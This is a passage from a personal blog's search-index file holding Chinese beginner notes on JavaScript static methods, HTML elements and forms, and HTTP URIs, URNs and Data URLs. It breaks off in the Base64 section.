super(father方法);</p><p>还可以使用原型链。</p><h4 id="JavaScript-静态方法"><a href="#JavaScript-静态方法" class="headerlink" title="JavaScript 静态方法"></a>JavaScript 静态方法</h4><blockquote><p>静态方法是使用 static 关键字修饰的方法，又叫类方法，属于类的，但不属于对象，在实例化对象之前可以通过 <strong>类名.方法名</strong> 调用静态方法。</p><p>静态方法不能在对象上调用，只能在类中调用。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTML入门</title>
      <link href="/2024/03/18/HTML%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/HTML%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="HTML入门"><a href="#HTML入门" class="headerlink" title="HTML入门"></a>HTML入门</h1><h2 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h2><ul><li>HTML全称：<strong>H</strong>yper <strong>T</strong>ext <strong>M</strong>arkup <strong>L</strong>anguage，是一种标记语言。</li><li>HTML文档也叫做 web 页面。</li><li>HTML文档由HTML标签嵌套和相关文本等组成，每种标签内还有对应的属性。</li><li>HTML元素是一个完整的标签和内容：一个 HTML 元素包含了开始标签与结束标签。</li><li>Web 浏览器：Web浏览器（如谷歌浏览器，Internet Explorer，Firefox，Safari）是用于读取HTML文件，并将其作为网页显示。浏览器并不是直接显示的HTML标签，但可以使用标签来决定如何展现HTML页面的内容给用户。</li><li>中文编码：目前在大部分浏览器中，直接输出中文会出现中文乱码的情况，这时候我们就需要在头部将字符声明为 UTF-8 或 GBK。example：<meta charset="UTF-8"></li></ul><h2 id="HTML元素"><a href="#HTML元素" class="headerlink" title="HTML元素"></a>HTML元素</h2><ul><li>HTML 元素以<strong>开始标签</strong>起始</li><li>HTML 元素以<strong>结束标签</strong>终止</li><li><strong>元素的内容</strong>是开始标签与结束标签之间的内容</li><li>某些 HTML 元素具有<strong>空内容（empty content）</strong></li><li>空元素<strong>在开始标签中进行关闭</strong>（以开始标签的结束而结束）</li><li>大多数 HTML 元素可拥有属性</li></ul><p>另外，HTML 文档由嵌套的 HTML 元素构成。</p><h2 id="HTML属性"><a href="#HTML属性" class="headerlink" title="HTML属性"></a>HTML属性</h2><ul><li>HTML 元素可以设置<strong>属性</strong></li><li>属性可以在元素中添加<strong>附加信息</strong></li><li>属性一般描述于<strong>开始标签</strong></li><li>属性总是以名称&#x2F;值对的形式出现，<strong>比如：name&#x3D;”value”</strong></li></ul><p>另外，属性值不强制单或双引号，但是在必要时候需要<strong>双</strong>里用<strong>单</strong></p><p>他人笔记：</p><ol><li>属性和属性值，尽量小写，本来这样做也方便些。</li><li>class 属性可以多用 <strong>class&#x3D;” “</strong> （引号里面可以填入多个class属性）</li><li>id 属性只能单独设置 **id&#x3D;” “**（只能填写一个，多个无效）</li></ol><h2 id="HTML文本格式化"><a href="#HTML文本格式化" class="headerlink" title="HTML文本格式化"></a>HTML文本格式化</h2><p><a href="http://www.it028.com/html-formatting.html">HTML 文本格式化 | 菜鸟教程 (it028.com)</a>。嘿嘿，没啥好说的</p><h2 id="HTML链接"><a href="#HTML链接" class="headerlink" title="HTML链接"></a>HTML链接</h2><p>HTML使用标签 <a>来设置超文本链接。</p><ol><li>超链接可以是一个字，一个词，或者一组词，也可以是一幅图像，您可以点击这些内容来跳转到新的文档或者当前文档中的某个部分。</li><li>当您把鼠标指针移动到网页中的某个链接上时，箭头会变为一只小手。</li><li>在标签<a> 中使用了href属性来描述链接的地址。</li><li>默认情况下，链接将以以下形式出现在浏览器中：</li></ol><ul><li><p>一个未访问过的链接显示为蓝色字体并带有下划线。</p></li><li><p>访问过的链接显示为紫色并带有下划线。</p></li><li><p>点击链接时，链接显示为红色并带有下划线。</p></li></ul><p>语法：<a href='url'>TEXT</a></p><p>对应属性：target</p><h2 id="head"><a href="#head" class="headerlink" title="&lt; head &gt;"></a>&lt; head &gt;</h2><p>内部元素：</p><p>Ⅰ. <title>标签：</p><p>1.<title> 在 HTML&#x2F;XHTML 文档中是必须的。</p><p>2.<title> 元素:</p><ul><li>定义了浏览器工具栏的标题</li><li>当网页添加到收藏夹时，显示在收藏夹中的标题</li><li>显示在搜索引擎结果页面的标题</li></ul><p>Ⅱ.<base>标签：</p><p>base&gt; 标签描述了基本的链接地址&#x2F;链接目标，该标签作为HTML文档中所有的链接标签的默认链接。</p><p>Ⅲ. <link>标签：</p><link> 标签定义了文档与外部资源之间的关系。<link> 标签通常用于链接到样式表。<p>Ⅳ. <style>标签：</p><style> 标签定义了HTML文档的样式文件引用地址.在<style> 元素中你也可以直接添加样式来渲染 HTML 文档:Ⅴ. < meta> 标签：meta标签描述了一些基本的元数据。META 元素通常用于指定网页的描述，关键词，文件的最后修改时间，作者，和其他元数据。元数据可以使用于浏览器（如何显示内容或重新加载页面），搜索引擎（关键词），或其他Web服务。Ⅵ. <script>标签：< script >标签用于加载脚本文件，如： JavaScript。上述详解：[HTML 头部 | 菜鸟教程 (it028.com)](http://www.it028.com/html-head.html)## 图像标签< img />属性：src = "url" ; alt="无法加载图片时的文本"< map >标签：[W3School TIY Editor](http://www.w3school.com.cn/tiy/t.asp?f=tags_areamap_1)## 表格标签定义：< table >  < /table >< th >表头；< tr >表的一行；< td >表格单元；## 列表标签### 无序列表：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Milk<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>### 有序列表：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">li</span>&gt;</span>Milk<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br></pre></td></tr></table></figure>### 定义列表：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dl</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>Coffee<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>Black hot drink<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dt</span>&gt;</span>Milk<span class="tag">&lt;/<span class="name">dt</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dd</span>&gt;</span>White cold drink<span class="tag">&lt;/<span class="name">dd</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dl</span>&gt;</span></span><br></pre></td></tr></table></figure>自定义列表不仅仅是一列项目，而是项目及其注释的组合。自定义列表以 <dl> 标签开始。每个自定义列表项以 <dt> 开始。每个自定义列表项的定义以 <dd> 开始。## < div >< span >块级元素：块级元素在浏览器显示时，通常会以新行来开始（和结束）。例子：<h1>, <p>, <ul>, <table>内联元素：内联元素在显示时通常不会以新行开始。例子：<b>, <td>, <a>, <img>< div >：HTML <div> 元素是块级元素，它是可用于组合其他 HTML 元素的容器。<div> 元素没有特定的含义。除此之外，由于它属于块级元素，浏览器会在其前后显示折行。如果与 CSS 一同使用，<div> 元素可用于对大的内容块设置样式属性。<div> 元素的另一个常见的用途是文档布局。它取代了使用表格定义布局的老式方法。使用 <table> 元素进行文档布局不是表格的正确用法。<table> 元素的作用是显示表格化的数据。< span >：HTML <span> 元素是内联元素，可用作文本的容器。<span> 元素也没有特定的含义。当与 CSS 一同使用时，<span> 元素可用于为部分文本设置样式属性。附：id属性详解：[HTML id 属性 (w3school.com.cn)](http://www.w3school.com.cn/html/html_id.asp)- `id` 属性用于为 HTML 元素指定唯一的 id（id只能用一次）- `id` 属性的值在 HTML 文档中必须是唯一的- CSS 和 JavaScript 可使用 `id` 属性来选取元素或设置特定元素的样式- `id` 属性的值区分大小写- `id` 属性还可用于创建 HTML 书签- JavaScript 可以使用 `getElementById()` 方法访问拥有特定 id 的元素## HTML内联框架frame 用于在网页内显示网页。语法：<iframe src="URL"></iframe>### 1.Iframe - 设置高度和宽度height 和 width 属性用于规定 iframe 的高度和宽度。属性值的默认单位是像素，但也可以用百分比来设定（比如 "80%"）。实例<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;demo_iframe.htm&quot;</span> <span class="attr">width</span>=<span class="string">&quot;200&quot;</span> <span class="attr">height</span>=<span class="string">&quot;200&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>### 2.Iframe - 删除边框frameborder 属性规定是否显示 iframe 周围的边框，设置属性值为 "0" 就可以移除边框### 3.使用 iframe 作为链接的目标iframe 可用作链接的目标（target），链接的 target 属性必须引用 iframe 的 name 属性：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;demo_iframe.htm&quot;</span> <span class="attr">name</span>=<span class="string">&quot;iframe_a&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.w3school.com.cn&quot;</span> <span class="attr">target</span>=<span class="string">&quot;iframe_a&quot;</span>&gt;</span>W3School.com.cn<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>### 语义元素HTML中的语义元素清楚地向浏览器和开发者描述其意义。<div>和<span>是非语义元素，但是<form>等可以| 标签         | 描述                                               || :----------- | :------------------------------------------------- || <article>    | 定义文章。                                         || <aside>      | 定义页面内容以外的内容。                           || <details>    | 定义用户能够查看或隐藏的额外细节。                 || <figcaption> | 定义 <figure> 元素的标题。                         || <figure>     | 规定自包含内容，比如图示、图表、照片、代码清单等。 || <footer>     | 定义文档或节的页脚。                               || <header>     | 规定文档或节的页眉。                               || <main>       | 规定文档的主内容。                                 || <mark>       | 定义重要的或强调的文本。                           || <nav>        | 定义导航链接。                                     || <section>    | 定义文档中的节。                                   || <summary>    | 定义 <details> 元素的可见标题。                    || <time>       | 定义日期/时间。                                    |### HTML规范1. < !DOCTYPE HTML >书写正确2. 元素及属性值小写3. 关闭每一个元素，即便它是空的4. 属性值加引号5. 类似alt等属性是必备的6. 正确空格和缩进，适当使用空格更加美观（等号两边）7. 避免长代码行8. 尽量使用小写文件名9. 使用正确的文件扩展名：.html(而不是.htm)，.css，.js### HTML字符实体在 HTML 中，某些字符是预留的。在 HTML 中不能使用小于号（<）和大于号（>），这是因为浏览器会误认为它们是标签。如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。空格：&nbsp参考链接：[HTML ISO-8859-1 参考手册 (w3school.com.cn)](http://www.w3school.com.cn/charsets/ref_html_8859.asp)### HTML表情使用UTF-8字符集：<meta charset="UTF-8">example : A = &#65Emoji 字符是来自 UTF-8 字母的字符：- 😄 是 128516- 😍 是 128525- 💗 是 128151😄 == &#128516### HTML框架Frame 标签定义了放置在每个框架中的 HTML 文档。在下面的这个例子中，我们设置了一个两列的框架集。第一列被设置为占据浏览器窗口的 25%。第二列被设置为占据浏览器窗口的 75%。HTML 文档 "frame_a.htm" 被置于第一个列中，而 HTML 文档 "frame_b.htm" 被置于第二个列中：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">frameset</span> <span class="attr">cols</span>=<span class="string">&quot;25%,75%&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;frame_a.htm&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">frame</span> <span class="attr">src</span>=<span class="string">&quot;frame_b.htm&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">frameset</span>&gt;</span></span><br></pre></td></tr></table></figure>假如一个框架有可见边框，用户可以拖动边框来改变它的大小。为了避免这种情况发生，可以在 <frame> 标签中加入：noresize="noresize"。### HTML背景#### 背景颜色（Bgcolor）背景颜色属性将背景设置为某种颜色。属性值可以是十六进制数、RGB 值或颜色名。<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;#000000&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;rgb(0,0,0)&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">bgcolor</span>=<span class="string">&quot;black&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>#### 背景图片<body background="abc.gif"><body background="https://abc.com/gg.gif">### URL编码在URL中，通常有一组被认为是"不特殊"字符的字符，它们不需要被进行URL编码，可以直接在URL中使用。这包括：1. **字母和数字：** 包括大写和小写字母（A-Z、a-z）以及数字（0-9）。2. **连字符和下划线：** "-"（连字符）和"_"（下划线）。3. **点号：** "."（点号）。4. **波浪线：** "~"（波浪线）。这些字符在URL中被认为是安全的，不会引起混淆或破坏URL结构。其他字符如果在URL中使用，就需要进行URL编码。URL 编码使用 "%" 其后跟随两位的十六进制数来替换非 ASCII 字符。URL 不能包含空格。URL 编码通常使用 + 来替换空格。### HTML表单#### 1.< form >标签< form > ······ < /form >块内写入表单，其属性见下表：| 属性                                                         | 描述                                                         || :----------------------------------------------------------- | :----------------------------------------------------------- || [accept-charset](http://www.w3school.com.cn/tags/att_form_accept-charset.asp) | 规定用于表单提交的字符编码。                                 || [action](http://www.w3school.com.cn/tags/att_form_action.asp) | 规定提交表单时将表单数据发送到何处。                         || [autocomplete](http://www.w3school.com.cn/tags/att_form_autocomplete.asp) | 规定表单是否应打开自动完成（填写）功能。                     || [enctype](http://www.w3school.com.cn/tags/att_form_enctype.asp) | 规定将表单数据提交到服务器时应如何编码（仅供 method="post"）。 || [method](http://www.w3school.com.cn/tags/att_form_method.asp) | 规定发送表单数据时要使用的 HTTP 方法。                       || [name](http://www.w3school.com.cn/tags/att_form_name.asp)    | 规定表单名称。                                               || [novalidate](http://www.w3school.com.cn/tags/att_form_novalidate.asp) | 规定提交时不应验证表单。                                     || [rel](http://www.w3school.com.cn/tags/att_form_rel.asp)      | 规定链接资源和当前文档之间的关系。                           || [target](http://www.w3school.com.cn/tags/att_form_target.asp) | 规定提交表单后在何处显示接收到的响应。                       |target属性有下值：| _blank    | 响应显示在新窗口或选项卡中。   || --------- | ------------------------------ || _self     | 响应显示在当前窗口中。         || _parent   | 响应显示在父框架中。           || _top      | 响应显示在窗口的整个 body 中。 || framename | 响应显示在命名的 iframe 中。   |例子：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;action_page.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">accept-charset</span>=<span class="string">&quot;UTF-8&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">ectype</span>=<span class="string">&quot;application/x-www-form-urlencoded&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span> <span class="attr">novalidate</span>&gt;</span></span><br><span class="line">.</span><br><span class="line">form elements</span><br><span class="line"> .</span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span> </span><br></pre></td></tr></table></figure>get与post简单提醒：关于 GET 的注意事项：- 以名称/值对的形式将表单数据追加到 URL- 永远不要使用 GET 发送敏感数据！（提交的表单数据在 URL 中可见！）- URL 的长度受到限制（2048 个字符）- 对于用户希望将结果添加为书签的表单提交很有用- GET 适用于非安全数据，例如 Google 中的查询字符串关于 POST 的注意事项：- 将表单数据附加在 HTTP 请求的正文中（不在 URL 中显示提交的表单数据）- POST 没有大小限制，可用于发送大量数据。- 带有 POST 的表单提交无法添加书签**提示：**如果表单数据包含敏感信息或个人信息，请务必使用 POST附：novalidate深究：[深入探究novalidate_笔记大全_设计学院 (python100.com)](https://www.python100.com/html/74598.html)#### 2.表单元素：< input >：属性有type，name， value。< input > 元素根据不同的 *type* 属性，可以变化为多种形态。< select >：例子：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">name</span>=<span class="string">&quot;cars&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;volvo&quot;</span>&gt;</span>Volvo<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;saab&quot;</span>&gt;</span>Saab<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;fiat&quot;</span>&gt;</span>Fiat<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;audi&quot;</span>&gt;</span>Audi<span class="tag">&lt;/<span class="name">option</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure>name类似于键，value类似于值。*<option>* 元素定义待选择的选项。列表通常会把首个选项显示为被选选项。您能够通过添加 selected 属性来定义预定义选项。< textarea >：该元素定义多行输入字段（*文本域*），如下例：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">name</span>=<span class="string">&quot;message&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;10&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;30&quot;</span>&gt;</span></span><br><span class="line">The cat was playing in the garden.</span><br><span class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure>< button >：该元素定义可点击的按钮，如下例：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">onclick</span>=<span class="string">&quot;alert(&#x27;Hello World!&#x27;)&quot;</span>&gt;</span>Click Me!<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure>< datalist >：预定义选项，如下例：<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;action_page.php&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">list</span>=<span class="string">&quot;browsers&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">datalist</span> <span class="attr">id</span>=<span class="string">&quot;browsers&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Internet Explorer&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Firefox&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Chrome&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Opera&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">option</span> <span class="attr">value</span>=<span class="string">&quot;Safari&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">datalist</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>#### 3.输入类型：link:[HTML 输入类型 (w3school.com.cn)](http://www.w3school.com.cn/html/html_form_input_types.asp)#### 4.input表单属性：value, readonly, disabled(禁用)等等link:[HTML Input 属性 (w3school.com.cn)](http://www.w3school.com.cn/html/html_form_attributes.asp)]]></content>
      
      
      <categories>
          
          <category> 语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTTP入门</title>
      <link href="/2024/03/18/HTTP%E5%85%A5%E9%97%A8/"/>
      <url>/2024/03/18/HTTP%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\css\APlayer.min.css"><script src="\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\js\Meting.min.js"></script><h1 id="HTTP入门"><a href="#HTTP入门" class="headerlink" title="HTTP入门"></a>HTTP入门</h1><h2 id="资源和URI"><a href="#资源和URI" class="headerlink" title="资源和URI"></a>资源和URI</h2><p>引入：HTTP 请求的内容通称为“资源”。”资源”这一概念非常宽泛，它可以是一份文档，一张图片，或所有其他你能够想到的格式。每个资源都由一个 （<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/URI">URI）</a> 来进行标识。</p><h3 id="URI"><a href="#URI" class="headerlink" title="URI"></a>URI</h3><p>URL(统一资源定位符)(Uniform Resource Locator)</p><p>URL又被称为Web地址，语法如下：</p><p><a href="http://www.example.com:port/path/to/file/?key1=1&key2=2#somewhere">http://www.example.com:port/path/to/file/?key1=1&amp;key2=2#somewhere</a></p><p>解析：</p><h4 id="1-protocol-方案或协议"><a href="#1-protocol-方案或协议" class="headerlink" title="1.protocol(方案或协议)"></a>1.protocol(方案或协议)</h4><p>常见的有http，https，具体如下表：</p><table><thead><tr><th align="left">方案</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">数据</td><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Basics_of_HTTP/Data_URLs">数据 URI</a></td></tr><tr><td align="left">文件</td><td align="left">指定主机上文件的名称</td></tr><tr><td align="left">FTP协议</td><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/FTP">文件传输协议</a></td></tr><tr><td align="left">HTTP&#x2F;HTTPS协议</td><td align="left"><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/HTTP">超文本传输 协议／安全的超文本传输协议</a></td></tr><tr><td align="left">mail至</td><td align="left">电子邮件地址</td></tr><tr><td align="left">SSH的</td><td align="left">安全 shell</td></tr><tr><td align="left">电话</td><td align="left">电话</td></tr><tr><td align="left">瓮</td><td align="left">统一资源名称</td></tr><tr><td align="left">查看源代码</td><td align="left">资源的源代码</td></tr><tr><td align="left">WS&#x2F;WSS</td><td align="left">（加密的）<a href="https://developer.mozilla.org/en-US/docs/Web/API/WebSockets_API">WebSocket （en-US）</a> 连接</td></tr></tbody></table><h4 id="2-主机"><a href="#2-主机" class="headerlink" title="2.主机"></a>2.主机</h4><p>Domain Name(域名)：<a href="http://www.example.com/">www.example.com</a></p><blockquote><p><code>www.example.com</code>既是一个域名，也代表管理该域名的机构。它指示了需要向网络上的哪一台主机发起请求。当然，也可以直接向主机的 <a href="https://developer.mozilla.org/zh-CN/docs/Glossary/IP_Address">IP address</a> 地址发起请求。但直接使用 IP 地址的场景并不常见。</p></blockquote><h4 id="3-端口-port"><a href="#3-端口-port" class="headerlink" title="3.端口(port)"></a>3.端口(port)</h4><blockquote><p>port表示用于访问 Web 服务器上资源的技术“门”。如果访问的该 Web 服务器使用 HTTP 协议的标准端口（HTTP 为 80，HTTPS 为 443）授予对其资源的访问权限，则通常省略此部分。否则端口就是 URI 必须的部分。</p></blockquote><h4 id="4-路径-path"><a href="#4-路径-path" class="headerlink" title="4.路径(path)"></a>4.路径(path)</h4><p>&#x2F;pah&#x2F;to&#x2F;file</p><blockquote><p><code>/path/to/myfile.html</code>是 Web 服务器上资源的路径。在 Web 的早期，类似这样的路径表示 Web 服务器上的物理文件位置。现在，它主要是由没有任何物理实体的 Web 服务器抽象处理而成的。</p></blockquote><h4 id="5-查询-参数"><a href="#5-查询-参数" class="headerlink" title="5.查询(参数)"></a>5.查询(参数)</h4><p>?key1&#x3D;1&amp;key2&#x3D;2</p><blockquote><p><code>?key1=value1&amp;key2=value2</code>是提供给 Web 服务器的额外参数。这些参数是用 &amp; 符号分隔的键&#x2F;值对列表。Web 服务器可以在将资源返回给用户之前使用这些参数来执行额外的操作。每个 Web 服务器都有自己的参数规则，想知道特定 Web 服务器如何处理参数的唯一可靠方法是询问该 Web 服务器所有者。</p></blockquote><h4 id="6-片段"><a href="#6-片段" class="headerlink" title="6.片段"></a>6.片段</h4><p>#somewhere</p><blockquote><p>是资源本身的某一部分的一个锚点。锚点代表资源内的一种”书签”，它给予浏览器显示位于该”加书签”点的内容的指示。例如，在 HTML 文档上，浏览器将滚动到定义锚点的那个点上；在视频或音频文档上，浏览器将转到锚点代表的那个时间。值得注意的是 # 号后面的部分，也称为片段标识符，永远不会与请求一起发送到服务器。</p></blockquote><p>举几个例子：</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>//developer.mozilla<span class="meta">.org</span>/<span class="built_in">zh</span>-CN/docs/Learn</span><br><span class="line"><span class="symbol">tel:</span>+<span class="number">1</span><span class="number">-816</span><span class="number">-555</span><span class="number">-1212</span></span><br><span class="line">git@github.com:mdn/browser-compat-data.git</span><br><span class="line"><span class="symbol">ftp:</span>//example<span class="meta">.org</span>/resource.txt</span><br><span class="line"><span class="symbol">urn:</span>isbn:<span class="number">9780141036144</span></span><br></pre></td></tr></table></figure><h3 id="URN"><a href="#URN" class="headerlink" title="URN"></a>URN</h3><p>URN全称为Uniform Resource Name(统一资源名称)，URN 是另一种形式的 URI，它通过特定命名空间中的唯一名称来标识资源。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">urn</span>:isbn:<span class="number">9780141036144</span></span><br><span class="line"><span class="attribute">urn</span>:ietf:rfc:<span class="number">7230</span></span><br></pre></td></tr></table></figure><p>上面两个 URN 标识了下面的资源：</p><ul><li>乔治·奥威尔所著的《1984》</li><li>IETF 规范 7230，超文本传输 协议 (HTTP&#x2F;1.1)：Message Syntax and Routing.</li></ul><h3 id="Data-URL"><a href="#Data-URL" class="headerlink" title="Data URL"></a>Data URL</h3><h4 id="Ⅰ-简介"><a href="#Ⅰ-简介" class="headerlink" title="Ⅰ. 简介"></a>Ⅰ. 简介</h4><blockquote><p><strong>Data URL</strong>，即前缀为 <code>data:</code> 协议的 URL，其允许内容创建者向文档中嵌入小文件。它们之前被称作“data URI”，直到这个名字被 WHATWG 弃用。</p></blockquote><p>语法：data:[<mediatype>][;base64],<data></p><p>Data URL 由四个部分组成：前缀（<code>data:</code>）、指示数据类型的 MIME 类型、如果非文本则为可选的 <code>base64</code> 标记、数据本身：</p><p>data:text&#x2F;plain;base64,Hello World</p><h4 id="Ⅱ-对数据base64编码"><a href="#Ⅱ-对数据base64编码" class="headerlink" title="Ⅱ.对数据base64编码"></a>Ⅱ.对数据base64编码</h4><p>简介</p><blockquote><p>Base64 